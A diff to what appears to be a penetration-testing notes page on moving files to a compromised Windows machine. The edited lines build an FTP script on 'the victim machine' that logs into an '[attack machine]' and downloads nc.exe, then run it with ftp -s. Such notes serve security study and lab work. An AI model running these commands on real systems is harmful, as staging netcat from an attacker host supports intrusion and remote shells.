@@ -11,18 +11,18 @@ Even though many Windows versions have FTP clients, we can't use them interactiv
 On the victim machine, echo the following commands into a file:
 
 ```text
-echo open [host] 21> ftp.txt
-echo USER username>> ftp.txt
-echo password>> ftp.txt
-echo bin>> ftp.txt
-echo GET wget.exe>> ftp.txt
+echo open [attack machine]> ftp.txt
+echo bob>> ftp.txt
+echo bob>> ftp.txt
+echo binary>> ftp.txt
+echo GET nc.exe>> ftp.txt
 echo bye>> ftp.txt
 ```
 
 Then run this command to connect:
 
 ```text
-ftp -v -n -s:ftp.txt
+ftp -s:ftp.txt
 ```
 
 ## TFTP
